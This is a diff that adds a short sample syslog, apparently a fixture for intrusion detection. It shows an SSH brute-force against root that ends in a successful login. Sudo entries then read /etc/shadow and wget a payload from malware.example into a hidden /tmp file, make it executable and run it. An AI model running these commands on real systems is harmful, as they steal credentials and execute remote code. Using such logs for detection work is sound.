@@ -1,0 +1,20 @@
+Nov 15 07:00:01 server01 sshd[1201]: Accepted publickey for deploy from 10.0.0.5 port 51234 ssh2
+Nov 15 07:15:22 server01 sshd[1302]: Failed password for root from 185.220.101.45 port 44821 ssh2
+Nov 15 07:15:24 server01 sshd[1303]: Failed password for root from 185.220.101.45 port 44822 ssh2
+Nov 15 07:15:26 server01 sshd[1304]: Failed password for root from 185.220.101.45 port 44823 ssh2
+Nov 15 07:15:28 server01 sshd[1305]: Failed password for root from 185.220.101.45 port 44824 ssh2
+Nov 15 07:15:30 server01 sshd[1306]: Failed password for root from 185.220.101.45 port 44825 ssh2
+Nov 15 07:15:32 server01 sshd[1307]: Failed password for admin from 185.220.101.45 port 44826 ssh2
+Nov 15 07:15:34 server01 sshd[1308]: Failed password for ubuntu from 185.220.101.45 port 44827 ssh2
+Nov 15 07:15:36 server01 sshd[1309]: Failed password for root from 185.220.101.45 port 44828 ssh2
+Nov 15 07:15:38 server01 sshd[1310]: Failed password for root from 185.220.101.45 port 44829 ssh2
+Nov 15 07:15:40 server01 sshd[1311]: Failed password for root from 185.220.101.45 port 44830 ssh2
+Nov 15 07:15:42 server01 sshd[1312]: Accepted password for root from 185.220.101.45 port 44831 ssh2
+Nov 15 07:15:43 server01 sshd[1312]: pam_unix(sshd:session): session opened for user root by (uid=0)
+Nov 15 07:16:01 server01 sudo: root : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/whoami
+Nov 15 07:16:10 server01 sudo: root : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/bin/cat /etc/shadow
+Nov 15 07:16:25 server01 sudo: root : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/wget http://malware.example/payload.sh -O /tmp/.x.sh
+Nov 15 07:16:30 server01 sudo: root : TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=/bin/chmod +x /tmp/.x.sh
+Nov 15 07:16:32 server01 sudo: root : TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=/tmp/.x.sh
+Nov 15 08:00:00 server01 CRON[2001]: (root) CMD (/usr/sbin/logrotate /etc/logrotate.conf)
+Nov 15 09:22:11 server01 sshd[2201]: Accepted publickey for deploy from 10.0.0.5 port 52001 ssh2
